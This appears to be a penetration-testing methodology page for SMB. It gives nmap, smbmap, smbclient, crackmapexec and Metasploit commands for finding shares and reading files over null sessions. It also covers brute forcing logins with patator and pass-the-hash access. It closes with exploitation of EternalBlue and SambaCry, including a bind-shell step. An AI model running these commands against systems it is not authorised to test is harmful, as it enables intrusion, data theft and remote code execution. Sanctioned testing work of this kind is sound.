# SMB - Methodology

### Overview

In a Windows environment, the Server Message Block (SMB) protocol is used to
share folders and files between computers.  

Sensible information can be stored in shares accessible to unauthenticated
users (NULL or GUEST session).

The SMB protocol has also been vulnerable to critical vulnerabilities, such as
MS17-010, allowing for privileged system command execution.  

### Network scan

`nmap` and `nbtscan` can be used to scan the network for SMB services and exposed
shares:

```
nmap -v -p 139,445 -A -oA nmap_smb <RANGE | CIDR>
nbtscan -r <RANGE>
```

### Basic recon

The `nmap` `smb-os-discovery.nse` script attempts to determine the operating
system, computer name, domain, workgroup, and current time over the SMB
protocol.

```
nmap --script smb-os-discovery.nse -p 445 <HOST>
nmap -sU -sS --script smb-os-discovery.nse -p U:137,T:139 <HOST>
```

### Null session

A null session refers to an unauthenticated NetBIOS session.  
A null session allows unauthenticated access to the shared files as well as a
large amounts of information about the machine, such as password policies,
usernames, group names, machine names, user and host SIDs.  
This Microsoft feature existed in SMB1 by default and was later restricted in
subsequent versions of SMB.  

To detect and retrieve information about the machine through a null session,
the `enum4linux` Perl as well as the `smbmap` scripts can be used. `enum4linux`
being outdated, `smbmap` is recommended as the go to tool.

```
smbmap -H <HOST>
enum4linux <HOST>
```

The following quick bash script can be used to combine a network scan and null
session enumeration:

```
nbtscan -s ' ' <RANGE> | cut -d ' ' -f 1 | while read -r line ; do
  smbmap -H $line > smbmap_$line.txt
done
```

### List accessible shares

Multiples tools can, and should, be used to list the shares available on the
targeted server. Different tools may held different results depending of the
system targeted.

If no credentials are provided, a null session will be attempted.  

```
# If no username provided, null session assumed
smbmap [-d <DOMAIN>] [-u <USERNAME>] [-p <PASSWORD | HASH>] (-H <HOST> | --host-file <FILE>)  

nmap -v -sT -p 139,445 --script smb-enum-shares.nse <HOST>
nmap -v -sU -sT -p U:137,T:139,445 --script smb-enum-shares.nse <HOST>
nmap -v -sT -p 139,445 <HOST> --script smb-enum-shares --script-args smbdomain=<DOMAIN/WORKGROUP>,smbusername=<USERNAME>,smbpassword=<PASSWORD>
nmap -v -sT -p 139,445 <HOST> --script smb-enum-shares --script-args smbdomain=<DOMAIN/WORKGROUP>,smbusername=<USERNAME>,smbhash=<HASH>

crackmapexec <TARGET> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --shares
crackmapexec <TARGET> -d <DOMAIN> -u <USERNAME> -H <HASH> --shares

msf > use auxiliary/scanner/smb/smb_enumshares

smbclient -U "" -N -L \\<NETBIOS_NAME | IP>
# Some Windows servers do not support IP only and require the NetBIOS name too
smbclient -U "" -N -L \\<NETBIOS_NAME> -I <IP>
# To authenticate as USERNAME. --pw-nt-hash to specify an NT hash instead of a cleartext password
smbclient -U <USERNAME> [--pw-nt-hash] ...
```

### List and search files

Similarly as for shares listing, multiples tools can be used to access an
exposed share.  

`smbmap` provides files searching capabilities and automatic download of files
matching the search criteria.

If no credentials are provided, a null session will be attempted.

```
smbmap [-d DOMAIN] [-u USERNAME] [-p PASSWORD/HASH] -R <SHARE> (-H HOST | --host-file FILE)  
smbmap [-d DOMAIN] [-u USERNAME] [-p PASSWORD/HASH] -F <PATTERN> (-H HOST | --host-file FILE)  

nmap -v -sT -p 139,445 <HOST> --script smb-enum-shares,smb-ls --script-args maxdepth=-1
nmap -v -sT -p 139,445 <HOST> --script smb-ls --script-args share=<SHARE>,maxdepth=-1
nmap -v -sT -p 139,445 <HOST> --script smb-enum-shares,smb-ls --script-args smbdomain=<DOMAIN/WORKGROUP>,smbusername=<USERNAME>,smbpassword=<PASSWORD>,maxdepth=-1
nmap -v -sT -p 139,445 <HOST> --script smb-enum-shares,smb-ls --script-args smbdomain=<DOMAIN/WORKGROUP>,smbusername=<USERNAME>,smbhash=<HASH>,maxdepth=-1

crackmapexec <TARGET> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -shares <SHARE> --spider
crackmapexec <TARGET> -d <DOMAIN> -u <USERNAME> -H <HASH> -shares <SHARE> --spider

msf > use auxiliary/scanner/smb/smb_enumshares
set ShowFiles true
set SpiderShares true
```

`smbmap` or `metasploit` can be used to download, upload or delete a file:

```
smbmap [-d DOMAIN] [-u USERNAME] [-p PASSWORD/HASH] --download/--upload/--delete <PATH> (-H HOST | --host-file FILE)

msf > use auxiliary/admin/smb/download_file
```

###### smbclient

The Linux `smbclient` CLI tool can be used to interact with the a SMB or SAMBA
share:

```
smbclient -U "" -N "\\\\<NETBIOS_NAME>\\<SHARE>"
smbclient -U "" -N "\\\\<IP>\\<SHARE>"

# To authenticate as USERNAME. --pw-nt-hash to specify an NT hash instead of a cleartext password
smbclient -U <USER> --pw-nt-hash ...
```

The following basic commands can be used through the client (partial list):

```
# Display the file to stdout
get <REMOTE_FILE> -

# Download a file from the remote system
get	<REMOTE_FILE> [<LOCAL_FILE>]

# Upload a file to the remote system
put	<LOCAL_FILE> [<REMOTE_FILE>]

# Change directory
# Remote system directory
cd <DIRECTORY>
# Local system directory
lcd <DIRECTORY>

# Directory listing
# Remote system directory
ls <DIRECTORY>
# Local system directory
!ls <DIRECTORY>

# Show all available info on a file (create time, change time, etc.)
allinfo <FILE>
```

To recursively upload / download a directory, use:

```
mask ""
recurse ON
prompt OFF
cd '<PATH_REMOTE_DIR>'
lcd '<PATH_LOCAL_DIR>'
mput / mget *
```

###### Mount shares

The share may also be mounted using the Linux `mount` utility tool (replacement
of smbmount):

```
# ro for read only and rw for read & write
# guest for null session or specify an user with username=
# vers=1.0 if any error arise

mount -t cifs //<HOST>//<SHARE> /mnt/<FOLDER> -o rw,guest,vers=1.0
mount -t cifs //<HOST>//<SHARE> /mnt/<FOLDER> -o rw,username=<USER>,password=<PASSWORD>,vers=1.0
```

From a Windows system, the `net` bultin can be used:

```
# NULL session
net use <DRIVELETTER>: \\<HOSTNAME/IP>\<SHARE> "" /user:""
net use <DRIVELETTER>: \\<HOSTNAME/IP>\<SHARE> /user:"<DOMAIN>\<USERNAME>"
```

###### Agent Ransack

The `Agent Ransack` GUI file searching tool can be used to conduct `grep` like
searches using the current Windows user identity and access rights.

Both file names or content can be searched.

The tool supports regex use, such as follow:

```
<KEYWORD1> OR <KEYWORD2>
<KEYWORD1> AND <KEYWORD2>
```

### Authentication brute force

The `patator` tool can be used to brute force credentials on the service:

```
patator smb_login host=<HOST> user=FILE0 password=FILE1 0=<WORDLIST_USER> 1=<WORDLIST_PASSWORD> -x ignore:fgrep='NT_STATUS_LOGON_FAILURE'
```

### Known vulnerabilities

`nmap` can be used to check for the following exploits:

```
smb-vuln-ms08-067
smb-vuln-ms10-054
smb-vuln-ms10-061
smb-vuln-ms17-010 / cve-2017-7494
smb-vuln-regsvc-dos

nmap -v -p 139,445 --script=vuln <HOST | CIDR>
```

###### Symlink Directory Traversal

Prerequisites:
  - Samba before 3.3.11, 3.4.x before 3.4.6, and 3.5.x before 3.5.0rc3
  - A writable share

Use the `metasploit` module `auxiliary/admin/smb/samba_symlink_traversal` to
exploit a directory traversal flaw and create a directory that will link to
the root filesystem.

https://www.exploit-db.com/exploits/33599/

###### EternalBlue & SambaCry

A remote code execution vulnerability exists in the way that the Microsoft
Server Message Block 1.0 (SMBv1) server handles certain requests. Write access
to the exposed share is required. Successful exploitation result in a SYSTEM
shell from an authenticated access.

*Detect vulnerability*

The `nmap` `smb-vuln-ms17-010.nse` and `smb-vuln-cve-2017-7494` scripts attempt
to detect if a SMBv1 server is vulnerable to the remote code execution
vulnerability MS17-010, a.k.a. EternalBlue (vulnerability exploited by WannaCry
and Petya ransomware) or CVE-2017-7494 aka SambaCry.

```
# EternalBlue
nmap --script smb-vuln-ms17-010.nse -p 445 <HOST | CIDR>

# SambaCry
nmap --script smb-vuln-cve-2017-7494 -p 445 <HOST | CIDR>
nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 <HOST | CIDR>
```

If no share is available to unauthenticated users, the server may still be
vulnerable for authenticated users, meaning finding credentials would lead to
RCE.  
The following versions are vulnerable:

```
# EternalBlue
https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010

# SambaCry
Samba 3.x after 3.5.0 and 4.x before 4.4.14, 4.5.x before 4.5.10, and 4.6.x before 4.6.4
```

*EternalBlue*

The following exploit may be used to achieve RCE through the EternalBlue
vulnerability on Windows hosts:

```
# Windows 7 and Server 2008 R2 (x64) All Service Packs
msf> use exploit/windows/smb/ms17_010_eternalblue
```

*SambaCry*

The following exploit may be used to achieve RCE through the SambaCry
vulnerability on Linux hosts:

```
# Source
https://github.com/opsxcq/exploit-CVE-2017-7494

# Usage
exploit.py [-h] -t <TARGET> -e <EXECUTABLE> -s <REMOTESHARE> -r <REMOTEPATH> [-u <USER>] [-p <PASSWORD>] [-P <REMOTESHELLPORT>]

# The libbindshell-samba.so of the repository can be used to get a bind shell on the server :
# -e libbindshell-samba.so -r <SHARE>/libbindshell-samba.so
```
